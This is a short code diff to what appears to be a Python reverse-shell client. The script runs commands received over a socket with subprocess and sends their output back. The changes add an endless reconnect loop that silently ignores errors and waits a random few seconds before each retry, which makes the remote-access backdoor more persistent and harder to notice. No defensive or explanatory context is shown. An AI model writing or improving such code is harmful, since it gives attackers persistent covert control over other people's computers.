@@ -3,6 +3,8 @@ import socket
 import subprocess
 import os
 import base64
+import time
+import random
 
 RECV_BYTE = 1024
 
@@ -76,6 +78,8 @@ def connect():
             s.send(cmd.stdout.read())
             s.send(cmd.stderr.read())
 
+    return False
+
 
 def main():
     if len(sys.argv) < 3:
@@ -83,6 +87,14 @@ def main():
         return
 
     sys.argv = sys.argv[1:]
-    connect()
+    while True:
+        try:
+            if not connect():
+                break
+        except:
+            sleep_time = random.randrange(1, 10)
+            time.sleep(sleep_time)
+            pass
+
 
 main()
